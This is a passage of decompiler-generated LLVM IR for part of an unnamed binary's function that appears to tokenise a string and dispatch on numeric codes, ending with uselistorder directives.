  %v1_10013dc4 = add i32 %v0_10013db0, -48
  store i32 %v1_10013dc4, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10013dc4, 8
  br i1 %tmp53, label %dec_label_pc_1001403c, label %dec_label_pc_10013dd0

dec_label_pc_10013dd0:                            ; preds = %dec_label_pc_10013dc4
  %v1_10013dd0 = add i32 %v0_10013db0, -56
  store i32 %v1_10013dd0, i32* %r0.global-to-local, align 4
  %v1_10013dd4 = add i32 %v0_10013db0, -44
  store i32 %v1_10013dd4, i32* @r27, align 4
  %v3_10013dd8 = icmp ugt i32 %v1_10013dd0, %v1_10013dd4
  %v0_10013ddc = load i32, i32* @r30, align 4
  %v1_10013ddc = add i32 %v0_10013ddc, 36
  store i32 %v1_10013ddc, i32* @r29, align 4
  %v1_10013de0 = add i32 %v0_10013ddc, 48
  store i32 %v1_10013de0, i32* @r26, align 4
  br i1 %v3_10013dd8, label %dec_label_pc_10013df4, label %dec_label_pc_10013dec

dec_label_pc_10013dec:                            ; preds = %dec_label_pc_10013dd0
  store i32 %v1_10013dd0, i32* @r27, align 4
  br label %dec_label_pc_10013df4

dec_label_pc_10013df4:                            ; preds = %dec_label_pc_10013dd0, %dec_label_pc_10013dec
  %v0_10013df4 = phi i32 [ %v1_10013dd0, %dec_label_pc_10013dec ], [ %v1_10013dd4, %dec_label_pc_10013dd0 ]
  %tmp54 = icmp ult i32 %v0_10013df4, 80
  br i1 %tmp54, label %dec_label_pc_1001403c, label %dec_label_pc_10013dfc

dec_label_pc_10013dfc:                            ; preds = %dec_label_pc_10013df4
  store i32 268516864, i32* @lr, align 4
  %v0_10013dfc = call i32 @function_10013cd8()
  store i32 %v0_10013dfc, i32* @r20, align 4
  %v3_10013e00 = icmp eq i32 %v0_10013dfc, 0
  br i1 %v3_10013e00, label %dec_label_pc_10013e20, label %dec_label_pc_10013e08

dec_label_pc_10013e08:                            ; preds = %dec_label_pc_10013dfc
  %v0_10013e08 = load i32, i32* @r24, align 4
  store i32 %v0_10013e08, i32* @r25, align 4
  %v0_10013e10 = load i32, i32* @r26, align 4
  store i32 %v0_10013e10, i32* @r23, align 4
  %v0_10013e14 = load i32, i32* @r31, align 4
  store i32 %v0_10013e14, i32* @r24, align 4
  store i32 %v0_10013e08, i32* %r21.global-to-local, align 4
  %v1_10013eb0.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10013ea8

dec_label_pc_10013e20:                            ; preds = %dec_label_pc_10013dfc
  %v1_10013e20 = load i32, i32* %r17.global-to-local, align 4
  %v2_10013e20 = inttoptr i32 %v1_10013e20 to i32*
  store i32 0, i32* %v2_10013e20, align 4
  %v0_10013e24 = call i32 @function_1000c85c()
  %v1_10013e28 = inttoptr i32 %v0_10013e24 to i32*
  %v2_10013e28 = load i32, i32* %v1_10013e28, align 4
  store i32 %v2_10013e28, i32* @r26, align 4
  br label %dec_label_pc_10014040

dec_label_pc_10013e30:                            ; preds = %dec_label_pc_10013fd0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10013e34 = load i32, i32* @r25, align 4
  %v1_10013e34 = load i32, i32* @r22, align 4
  %v2_10013e34 = inttoptr i32 %v1_10013e34 to i32*
  store i32 %v0_10013e34, i32* %v2_10013e34, align 4
  %v0_10013e38 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e38 = load i32, i32* @r22, align 4
  %v2_10013e38 = add i32 %v1_10013e38, 4
  %v3_10013e38 = inttoptr i32 %v2_10013e38 to i32*
  store i32 %v0_10013e38, i32* %v3_10013e38, align 4
  %v0_10013e3c = load i32, i32* @r30, align 4
  %v1_10013e3c = add i32 %v0_10013e3c, 8
  store i32 %v1_10013e3c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10013e44 = add i32 %v0_10013e3c, 4
  %v2_10013e44 = inttoptr i32 %v1_10013e44 to i32*
  %v3_10013e44 = load i32, i32* %v2_10013e44, align 4
  store i32 %v3_10013e44, i32* %r0.global-to-local, align 4
  %v0_10013e48 = load i32, i32* %r19.global-to-local, align 4
  %v1_10013e48 = load i32, i32* @r28, align 4
  %v2_10013e48 = add i32 %v1_10013e48, 8
  %v3_10013e48 = inttoptr i32 %v2_10013e48 to i32*
  store i32 %v0_10013e48, i32* %v3_10013e48, align 4
  %v0_10013e4c = load i32, i32* @r22, align 4
  %v1_10013e4c = load i32, i32* @r28, align 4
  %v2_10013e4c = add i32 %v1_10013e4c, 16
  %v3_10013e4c = inttoptr i32 %v2_10013e4c to i32*
  store i32 %v0_10013e4c, i32* %v3_10013e4c, align 4
  %v0_10013e50 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e50 = load i32, i32* @r28, align 4
  %v2_10013e50 = inttoptr i32 %v1_10013e50 to i32*
  store i32 %v0_10013e50, i32* %v2_10013e50, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10013e58 = load i32, i32* @r28, align 4
  %v2_10013e58 = add i32 %v1_10013e58, 12
  %v3_10013e58 = inttoptr i32 %v2_10013e58 to i32*
  store i32 4, i32* %v3_10013e58, align 4
  br label %dec_label_pc_10013e8c

dec_label_pc_10013e60:                            ; preds = %dec_label_pc_10013ff4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10013e64 = load i32, i32* %r21.global-to-local, align 4
  %v1_10013e64 = load i32, i32* @r23, align 4
  %v2_10013e64 = inttoptr i32 %v1_10013e64 to i32*
  store i32 %v0_10013e64, i32* %v2_10013e64, align 4
  %v0_10013e68 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e68 = load i32, i32* @r23, align 4
  %v2_10013e68 = add i32 %v1_10013e68, 4
  %v3_10013e68 = inttoptr i32 %v2_10013e68 to i32*
  store i32 %v0_10013e68, i32* %v3_10013e68, align 4
  %v0_10013e6c = load i32, i32* @r30, align 4
  %v1_10013e6c = add i32 %v0_10013e6c, 8
  store i32 %v1_10013e6c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10013e74 = add i32 %v0_10013e6c, 4
  %v2_10013e74 = inttoptr i32 %v1_10013e74 to i32*
  %v3_10013e74 = load i32, i32* %v2_10013e74, align 4
  store i32 %v3_10013e74, i32* %r0.global-to-local, align 4
  %v0_10013e78 = load i32, i32* %r19.global-to-local, align 4
  %v1_10013e78 = load i32, i32* @r28, align 4
  %v2_10013e78 = add i32 %v1_10013e78, 8
  %v3_10013e78 = inttoptr i32 %v2_10013e78 to i32*
  store i32 %v0_10013e78, i32* %v3_10013e78, align 4
  %v0_10013e7c = load i32, i32* @r23, align 4
  %v1_10013e7c = load i32, i32* @r28, align 4
  %v2_10013e7c = add i32 %v1_10013e7c, 16
  %v3_10013e7c = inttoptr i32 %v2_10013e7c to i32*
  store i32 %v0_10013e7c, i32* %v3_10013e7c, align 4
  %v0_10013e80 = load i32, i32* %r0.global-to-local, align 4
  %v1_10013e80 = load i32, i32* @r28, align 4
  %v2_10013e80 = inttoptr i32 %v1_10013e80 to i32*
  store i32 %v0_10013e80, i32* %v2_10013e80, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10013e88 = load i32, i32* @r28, align 4
  %v2_10013e88 = add i32 %v1_10013e88, 12
  %v3_10013e88 = inttoptr i32 %v2_10013e88 to i32*
  store i32 16, i32* %v3_10013e88, align 4
  br label %dec_label_pc_10013e8c

dec_label_pc_10013e8c:                            ; preds = %dec_label_pc_10013e30, %dec_label_pc_10013e60
  %v0_10013e8c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e8c = load i32, i32* @r28, align 4
  %v2_10013e8c = add i32 %v1_10013e8c, 4
  %v3_10013e8c = inttoptr i32 %v2_10013e8c to i32*
  store i32 %v0_10013e8c, i32* %v3_10013e8c, align 4
  %v0_10013e90 = load i32, i32* @r28, align 4
  %v1_10013e90 = load i32, i32* %r17.global-to-local, align 4
  %v2_10013e90 = inttoptr i32 %v1_10013e90 to i32*
  store i32 %v0_10013e90, i32* %v2_10013e90, align 4
  br label %dec_label_pc_10014028

dec_label_pc_10013e98:                            ; preds = %dec_label_pc_10013d90
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10013ea8

dec_label_pc_10013ea8:                            ; preds = %dec_label_pc_10013e08, %dec_label_pc_10013e98
  %v1_10013eb0 = phi i32 [ %v1_10013eb0.pre, %dec_label_pc_10013e08 ], [ %arg8, %dec_label_pc_10013e98 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10013eb0 = inttoptr i32 %v1_10013eb0 to i32*
  store i32 1, i32* %v2_10013eb0, align 4
  br label %dec_label_pc_10014010

dec_label_pc_10013eb8:                            ; preds = %dec_label_pc_10014010
  %v0_10013eb8 = load i32, i32* @r24, align 4
  store i32 %v0_10013eb8, i32* @r3, align 4
  store i32 268517060, i32* @lr, align 4
  %v2_10013ec0 = call i32 @function_1000de0c(i32 %v0_10013eb8, i32 35)
  %v4_10013ec4 = icmp eq i32 %v2_10013ec0, 0
  br i1 %v4_10013ec4, label %dec_label_pc_10013ed4, label %dec_label_pc_10013ecc

dec_label_pc_10013ecc:                            ; preds = %dec_label_pc_10013eb8
  %v3_10013ec0 = inttoptr i32 %v2_10013ec0 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10013ec0, align 1
  br label %dec_label_pc_10013ed4

dec_label_pc_10013ed4:                            ; preds = %dec_label_pc_10013eb8, %dec_label_pc_10013ecc
  %v0_10013ed4 = load i32, i32* @r24, align 4
  store i32 %v0_10013ed4, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_10013f5017 = inttoptr i32 %v0_10013ed4 to i8*
  %v2_10013f5018 = load i8, i8* %v1_10013f5017, align 1
  %v3_10013f5019 = zext i8 %v2_10013f5018 to i32
  store i32 %v3_10013f5019, i32* %r0.global-to-local, align 4
  %v3_10013f5421 = icmp eq i8 %v2_10013f5018, 0
  br i1 %v3_10013f5421, label %dec_label_pc_10013f5c, label %dec_label_pc_10013eec.preheader

dec_label_pc_10013ee0:                            ; preds = %dec_label_pc_10013efc
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10013ee4 = inttoptr i32 %v0_10013f20 to i8*
  store i8 0, i8* %v3_10013ee4, align 1
  %v0_10013ee8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013ee8 = add i32 %v0_10013ee8, 1
  store i32 %v1_10013ee8, i32* %r11.global-to-local, align 4
  %v1_10013eec = inttoptr i32 %v1_10013ee8 to i8*
  %v2_10013eec = load i8, i8* %v1_10013eec, align 1
  %v3_10013eec = zext i8 %v2_10013eec to i32
  store i32 %v3_10013eec, i32* %r0.global-to-local, align 4
  %v3_10013ef0 = icmp eq i8 %v2_10013eec, 0
  br i1 %v3_10013ef0, label %dec_label_pc_10013f5c, label %dec_label_pc_10013efc

dec_label_pc_10013efc:                            ; preds = %dec_label_pc_10013eec.preheader, %dec_label_pc_10013ee0
  %v0_10013f20 = phi i32 [ %v1_10013ee8, %dec_label_pc_10013ee0 ], [ %v0_10013eec2, %dec_label_pc_10013eec.preheader ]
  %v0_10013f04.in = phi i32 [ %v3_10013eec, %dec_label_pc_10013ee0 ], [ %v3_10013eec5, %dec_label_pc_10013eec.preheader ]
  %v0_10013f04 = mul nuw nsw i32 %v0_10013f04.in, 2
  %v3_10013f00 = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_10013f00, i32* %r9.global-to-local, align 4
  %v2_10013f04 = add i32 %v3_10013f00, %v0_10013f04
  %v3_10013f04 = inttoptr i32 %v2_10013f04 to i16*
  %v4_10013f04 = load i16, i16* %v3_10013f04, align 2
  %v5_10013f04 = zext i16 %v4_10013f04 to i32
  store i32 %v5_10013f04, i32* %r0.global-to-local, align 4
  %v1_10013f08 = and i32 %v5_10013f04, 32
  store i32 %v1_10013f08, i32* %r9.global-to-local, align 4
  %v3_10013f08 = icmp eq i32 %v1_10013f08, 0
  br i1 %v3_10013f08, label %dec_label_pc_10013f10, label %dec_label_pc_10013ee0

dec_label_pc_10013f10:                            ; preds = %dec_label_pc_10013efc
  %v0_10013f10 = load i32, i32* @r29, align 4
  %v2_10013f10 = icmp sgt i32 %v0_10013f10, 6
  br i1 %v2_10013f10, label %dec_label_pc_10013f2c.preheader, label %dec_label_pc_10013f18

dec_label_pc_10013f18:                            ; preds = %dec_label_pc_10013f10
  %v1_10013f18 = mul i32 %v0_10013f10, 4
  store i32 %v1_10013f18, i32* %r0.global-to-local, align 4
  %v1_10013f1c = add i32 %v0_10013f10, 1
  store i32 %v1_10013f1c, i32* @r29, align 4
  %v1_10013f20 = load i32, i32* @r30, align 4
  %v3_10013f20 = add i32 %v1_10013f20, %v1_10013f18
  %v4_10013f20 = inttoptr i32 %v3_10013f20 to i32*
  store i32 %v0_10013f20, i32* %v4_10013f20, align 4
  %v0_10013f2c9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013f2c.preheader

dec_label_pc_10013f2c.preheader:                  ; preds = %dec_label_pc_10013f18, %dec_label_pc_10013f10
  %v0_10013f2c9 = phi i32 [ %v0_10013f2c9.pre, %dec_label_pc_10013f18 ], [ %v0_10013f20, %dec_label_pc_10013f10 ]
  %v1_10013f2c10 = inttoptr i32 %v0_10013f2c9 to i8*
  %v2_10013f2c11 = load i8, i8* %v1_10013f2c10, align 1
  %v3_10013f2c12 = zext i8 %v2_10013f2c11 to i32
  store i32 %v3_10013f2c12, i32* %r0.global-to-local, align 4
  %v3_10013f3014 = icmp eq i8 %v2_10013f2c11, 0
  br i1 %v3_10013f3014, label %dec_label_pc_10013f50.loopexit, label %dec_label_pc_10013f3c.lr.ph

dec_label_pc_10013f3c.lr.ph:                      ; preds = %dec_label_pc_10013f2c.preheader
  %v3_10013f40.pre = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_10013f3c

dec_label_pc_10013f28:                            ; preds = %dec_label_pc_10013f3c
  %v1_10013f28 = add i32 %v0_10013f28, 1
  store i32 %v1_10013f28, i32* %r11.global-to-local, align 4
  %v1_10013f2c = inttoptr i32 %v1_10013f28 to i8*
  %v2_10013f2c = load i8, i8* %v1_10013f2c, align 1
  %v3_10013f2c = zext i8 %v2_10013f2c to i32
  store i32 %v3_10013f2c, i32* %r0.global-to-local, align 4
  %v3_10013f30 = icmp eq i8 %v2_10013f2c, 0
  br i1 %v3_10013f30, label %dec_label_pc_10013f50.loopexit, label %dec_label_pc_10013f3c

dec_label_pc_10013f3c:                            ; preds = %dec_label_pc_10013f3c.lr.ph, %dec_label_pc_10013f28
  %v0_10013f28 = phi i32 [ %v0_10013f2c9, %dec_label_pc_10013f3c.lr.ph ], [ %v1_10013f28, %dec_label_pc_10013f28 ]
  %v0_10013f44.in = phi i32 [ %v3_10013f2c12, %dec_label_pc_10013f3c.lr.ph ], [ %v3_10013f2c, %dec_label_pc_10013f28 ]
  %v0_10013f44 = mul nuw nsw i32 %v0_10013f44.in, 2
  store i32 %v3_10013f40.pre, i32* %r9.global-to-local, align 4
  %v2_10013f44 = add i32 %v0_10013f44, %v3_10013f40.pre
  %v3_10013f44 = inttoptr i32 %v2_10013f44 to i16*
  %v4_10013f44 = load i16, i16* %v3_10013f44, align 2
  %v5_10013f44 = zext i16 %v4_10013f44 to i32
  store i32 %v5_10013f44, i32* %r0.global-to-local, align 4
  %v1_10013f48 = and i32 %v5_10013f44, 32
  store i32 %v1_10013f48, i32* %r9.global-to-local, align 4
  %v3_10013f48 = icmp eq i32 %v1_10013f48, 0
  br i1 %v3_10013f48, label %dec_label_pc_10013f28, label %dec_label_pc_10013f50.loopexit

dec_label_pc_10013f50.loopexit:                   ; preds = %dec_label_pc_10013f3c, %dec_label_pc_10013f28, %dec_label_pc_10013f2c.preheader
  %v0_10013f50 = phi i32 [ %v0_10013f2c9, %dec_label_pc_10013f2c.preheader ], [ %v0_10013f28, %dec_label_pc_10013f3c ], [ %v1_10013f28, %dec_label_pc_10013f28 ]
  %v1_10013f50 = inttoptr i32 %v0_10013f50 to i8*
  %v2_10013f50 = load i8, i8* %v1_10013f50, align 1
  %v3_10013f50 = zext i8 %v2_10013f50 to i32
  store i32 %v3_10013f50, i32* %r0.global-to-local, align 4
  %v3_10013f54 = icmp eq i8 %v2_10013f50, 0
  br i1 %v3_10013f54, label %dec_label_pc_10013f5c, label %dec_label_pc_10013eec.preheader

dec_label_pc_10013eec.preheader:                  ; preds = %dec_label_pc_10013ed4, %dec_label_pc_10013f50.loopexit
  %v0_10013eec2 = phi i32 [ %v0_10013f50, %dec_label_pc_10013f50.loopexit ], [ %v0_10013ed4, %dec_label_pc_10013ed4 ]
  %v1_10013eec3 = inttoptr i32 %v0_10013eec2 to i8*
  %v2_10013eec4 = load i8, i8* %v1_10013eec3, align 1
  %v3_10013eec5 = zext i8 %v2_10013eec4 to i32
  store i32 %v3_10013eec5, i32* %r0.global-to-local, align 4
  %v3_10013ef07 = icmp eq i8 %v2_10013eec4, 0
  br i1 %v3_10013ef07, label %dec_label_pc_10013f5c, label %dec_label_pc_10013efc

dec_label_pc_10013f5c:                            ; preds = %dec_label_pc_10013f50.loopexit, %dec_label_pc_10013eec.preheader, %dec_label_pc_10013ee0, %dec_label_pc_10013ed4
  %v0_10013f5c = load i32, i32* @r29, align 4
  %v1_10013f60 = mul i32 %v0_10013f5c, 4
  store i32 %v1_10013f60, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10013f68 = load i32, i32* @r30, align 4
  %v3_10013f68 = add i32 %v2_10013f68, %v1_10013f60
  %v4_10013f68 = inttoptr i32 %v3_10013f68 to i32*
  store i32 0, i32* %v4_10013f68, align 4
  %tmp55 = icmp slt i32 %v0_10013f5c, 2
  br i1 %tmp55, label %dec_label_pc_10014010, label %dec_label_pc_10013f70

dec_label_pc_10013f70:                            ; preds = %dec_label_pc_10013f5c
  %v0_10013f70 = load i32, i32* %r18.global-to-local, align 4
  %v3_10013f70 = icmp eq i32 %v0_10013f70, 1
  br i1 %v3_10013f70, label %dec_label_pc_10014028, label %dec_label_pc_10013f78

dec_label_pc_10013f78:                            ; preds = %dec_label_pc_10013f70
  %v3_10013f78 = icmp eq i32 %v0_10013f70, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10013f78, label %dec_label_pc_10013f84, label %dec_label_pc_10013fb0.preheader

dec_label_pc_10013fb0.preheader:                  ; preds = %dec_label_pc_10013f78
  %v1_10013fb023 = load i32, i32* @r29, align 4
  %v2_10013fb024 = icmp sgt i32 %v1_10013fb023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10013fb829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10013fb829, i32* @r3, align 4
  br i1 %v2_10013fb024, label %dec_label_pc_10013f9c, label %dec_label_pc_10013fc0

dec_label_pc_10013f84:                            ; preds = %dec_label_pc_10013f78
  %v0_10013f84 = load i32, i32* @r30, align 4
  %v1_10013f84 = inttoptr i32 %v0_10013f84 to i32*
  %v2_10013f84 = load i32, i32* %v1_10013f84, align 4
  store i32 %v2_10013f84, i32* @r4, align 4
  %v0_10013f88 = load i32, i32* %r15.global-to-local, align 4
  %v2_10013f8c = inttoptr i32 %v0_10013f88 to i8*
  %v3_10013f8c = call i32 @function_1000df0c(i8* %v2_10013f8c, i32 %v2_10013f84)
  %v3_10013f90 = icmp eq i32 %v3_10013f8c, 0
  br i1 %v3_10013f90, label %dec_label_pc_10013fc8, label %dec_label_pc_10014010

dec_label_pc_10013f9c:                            ; preds = %dec_label_pc_10013fb0.preheader, %dec_label_pc_10013fac
  %v1_10013f9c = phi i32 [ %v1_10013fb4, %dec_label_pc_10013fac ], [ 4, %dec_label_pc_10013fb0.preheader ]
  %v0_10013fb831 = phi i32 [ %v0_10013fb8, %dec_label_pc_10013fac ], [ %v0_10013fb829, %dec_label_pc_10013fb0.preheader ]
  %v0_10013f9c = load i32, i32* @r30, align 4
  %v2_10013f9c = add i32 %v0_10013f9c, %v1_10013f9c
  %v3_10013f9c = inttoptr i32 %v2_10013f9c to i32*
  %v4_10013f9c = load i32, i32* %v3_10013f9c, align 4
  store i32 %v4_10013f9c, i32* @r4, align 4
  %v2_10013fa0 = call i32 @function_10014260(i32 %v0_10013fb831, i32 %v4_10013f9c)
  %v3_10013fa4 = icmp eq i32 %v2_10013fa0, 0
  %v0_10013fc0.pre = load i32, i32* @r31, align 4
  br i1 %v3_10013fa4, label %dec_label_pc_10013f9c.dec_label_pc_10013fc0_crit_edge, label %dec_label_pc_10013fac

dec_label_pc_10013fac:                            ; preds = %dec_label_pc_10013f9c
  %v1_10013fac = add i32 %v0_10013fc0.pre, 1
  store i32 %v1_10013fac, i32* @r31, align 4
  %v1_10013fb0 = load i32, i32* @r29, align 4
  %v2_10013fb0 = icmp slt i32 %v1_10013fac, %v1_10013fb0
  %v1_10013fb4 = mul i32 %v1_10013fac, 4
  store i32 %v1_10013fb4, i32* %r0.global-to-local, align 4
  %v0_10013fb8 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10013fb8, i32* @r3, align 4
  br i1 %v2_10013fb0, label %dec_label_pc_10013f9c, label %dec_label_pc_10013fc0

dec_label_pc_10013f9c.dec_label_pc_10013fc0_crit_edge: ; preds = %dec_label_pc_10013f9c
  %v1_10013fc0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10013fc0

dec_label_pc_10013fc0:                            ; preds = %dec_label_pc_10013fac, %dec_label_pc_10013f9c.dec_label_pc_10013fc0_crit_edge, %dec_label_pc_10013fb0.preheader
  %v1_10013fc0 = phi i32 [ %v1_10013fc0.pre, %dec_label_pc_10013f9c.dec_label_pc_10013fc0_crit_edge ], [ %v1_10013fb023, %dec_label_pc_10013fb0.preheader ], [ %v1_10013fb0, %dec_label_pc_10013fac ]
  %v0_10013fc0 = phi i32 [ %v0_10013fc0.pre, %dec_label_pc_10013f9c.dec_label_pc_10013fc0_crit_edge ], [ 1, %dec_label_pc_10013fb0.preheader ], [ %v1_10013fac, %dec_label_pc_10013fac ]
  %v2_10013fc0 = icmp slt i32 %v0_10013fc0, %v1_10013fc0
  br i1 %v2_10013fc0, label %dec_label_pc_10013fc8, label %dec_label_pc_10014010

dec_label_pc_10013fc8:                            ; preds = %dec_label_pc_10013f84, %dec_label_pc_10013fc0
  %v0_10013fc8 = load i32, i32* %r19.global-to-local, align 4
  %v3_10013fc8 = icmp eq i32 %v0_10013fc8, 2
  br i1 %v3_10013fc8, label %dec_label_pc_10013fd0, label %dec_label_pc_10013fec

dec_label_pc_10013fd0:                            ; preds = %dec_label_pc_10013fc8
  %v0_10013fd0 = load i32, i32* @r30, align 4
  %v1_10013fd0 = inttoptr i32 %v0_10013fd0 to i32*
  %v2_10013fd0 = load i32, i32* %v1_10013fd0, align 4
  %v0_10013fd8 = load i32, i32* @r25, align 4
  store i32 268517344, i32* @lr, align 4
  %v3_10013fdc = inttoptr i32 %v2_10013fd0 to i8*
  %v4_10013fdc = call i32 @function_10013360(i32 2, i8* %v3_10013fdc, i32 %v0_10013fd8)
  %v2_10013fe0 = icmp sgt i32 %v4_10013fdc, 0
  br i1 %v2_10013fe0, label %dec_label_pc_10013e30, label %dec_label_pc_1001400c

dec_label_pc_10013fec:                            ; preds = %dec_label_pc_10013fc8
  %v3_10013fec = icmp eq i32 %v0_10013fc8, 10
  br i1 %v3_10013fec, label %dec_label_pc_10013ff4, label %dec_label_pc_1001400c

dec_label_pc_10013ff4:                            ; preds = %dec_label_pc_10013fec
  %v0_10013ff4 = load i32, i32* @r30, align 4
  %v1_10013ff4 = inttoptr i32 %v0_10013ff4 to i32*
  %v2_10013ff4 = load i32, i32* %v1_10013ff4, align 4
  %v0_10013ffc = load i32, i32* %r21.global-to-local, align 4
  store i32 268517380, i32* @lr, align 4
  %v3_10014000 = inttoptr i32 %v2_10013ff4 to i8*
  %v4_10014000 = call i32 @function_10013360(i32 10, i8* %v3_10014000, i32 %v0_10013ffc)
  %v2_10014004 = icmp sgt i32 %v4_10014000, 0
  br i1 %v2_10014004, label %dec_label_pc_10013e60, label %dec_label_pc_1001400c

dec_label_pc_1001400c:                            ; preds = %dec_label_pc_10013fd0, %dec_label_pc_10013fec, %dec_label_pc_10013ff4
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10014010

dec_label_pc_10014010:                            ; preds = %dec_label_pc_10013fc0, %dec_label_pc_10013f84, %dec_label_pc_10013f5c, %dec_label_pc_1001400c, %dec_label_pc_10013ea8
  %v0_10014010 = load i32, i32* @r24, align 4
  %v0_10014014 = load i32, i32* @r27, align 4
  %v0_10014018 = load i32, i32* @r20, align 4
  store i32 268517408, i32* @lr, align 4
  %v3_1001401c = call i32 @function_10012c34(i32 %v0_10014010, i32 %v0_10014014, i32 %v0_10014018)
  %v3_10014020 = icmp eq i32 %v3_1001401c, 0
  br i1 %v3_10014020, label %dec_label_pc_10014028, label %dec_label_pc_10013eb8

dec_label_pc_10014028:                            ; preds = %dec_label_pc_10014010, %dec_label_pc_10013f70, %dec_label_pc_10013e8c
  %v0_10014028 = load i32, i32* %r18.global-to-local, align 4
  %v3_10014028 = icmp eq i32 %v0_10014028, 1
  br i1 %v3_10014028, label %dec_label_pc_10014040, label %dec_label_pc_10014030

dec_label_pc_10014030:                            ; preds = %dec_label_pc_10014028
  %v0_10014030 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10014038.856 to i32), i32* @lr, align 4
  %v1_10014034 = inttoptr i32 %v0_10014030 to i16*
  %v2_10014034 = call i32 @function_1001259c(i16* %v1_10014034)
  br label %dec_label_pc_10014040

dec_label_pc_1001403c:                            ; preds = %dec_label_pc_10013df4, %dec_label_pc_10013dc4, %dec_label_pc_10013dbc, %dec_label_pc_10013db0, %dec_label_pc_10013da0, %dec_label_pc_10013d88, %dec_label_pc_10013d78
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10014040

dec_label_pc_10014040:                            ; preds = %dec_label_pc_10014028, %dec_label_pc_10014030, %dec_label_pc_10013e20, %dec_label_pc_1001403c
  store i32 %v0_10013d40, i32* %r0.global-to-local, align 4
  %v0_10014044 = load i32, i32* @r26, align 4
  ret i32 %v0_10014044

; uselistorder directives
  uselistorder i32 %v0_10013fb8, { 1, 0 }
  uselistorder i32 %v1_10013fac, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10013f60, { 1, 0 }
  uselistorder i32 %v0_10013f5c, { 1, 0 }
  uselistorder i32 %v3_10013eec5, { 1, 0 }
  uselistorder i32 %v0_10013eec2, { 1, 0 }
  uselistorder i32 %v1_10013f18, { 1, 0 }
  uselistorder i32 %v0_10013f10, { 1, 0, 2 }
  uselistorder i32 %v2_10013ec0, { 1, 0 }
  uselistorder i32 %v0_10013db0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013d88.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10013d4c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 6, 7, 10, 1, 2, 3, 8, 9, 5, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @function_10012c34, { 1, 0 }
  uselistorder i32 10, { 12, 34, 35, 36, 37, 38, 39, 40, 18, 19, 20, 21, 22, 42, 41, 43, 44, 7, 45, 1, 28, 2, 29, 0, 8, 13, 46, 14, 23, 3, 4, 25, 9, 30, 31, 15, 6, 24, 26, 27, 16, 5, 11, 10, 32, 17, 33 }
  uselistorder i32 (i8*, i32)* @function_1000df0c, { 17, 18, 19, 20, 0, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 6, { 29, 30, 31, 32, 33, 0, 1, 2, 19, 20, 21, 22, 10, 11, 34, 3, 25, 26, 6, 4, 27, 12, 28, 5, 13, 14, 15, 16, 7, 8, 17, 23, 24, 9, 18 }
  uselistorder i32* @global_var_1002b8c0, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 80, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder i32 48, { 25, 10, 11, 12, 1, 13, 14, 26, 5, 16, 17, 2, 18, 19, 20, 7, 21, 6, 22, 3, 0, 23, 24, 15, 8, 9, 4 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 3, 0, 1 }
  uselistorder i32 -48, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32* @r27, { 46, 47, 48, 49, 50, 51, 1, 52, 53, 54, 55, 9, 10, 6, 11, 3, 2, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 44, 45, 22, 23, 88, 4, 89, 90, 95, 14, 15, 82, 83, 84, 85, 86, 87, 91, 92, 93, 24, 25, 26, 27, 5, 28, 29, 30, 31, 32, 7, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 8, 12, 13, 94, 20, 21, 16, 17, 18, 19 }
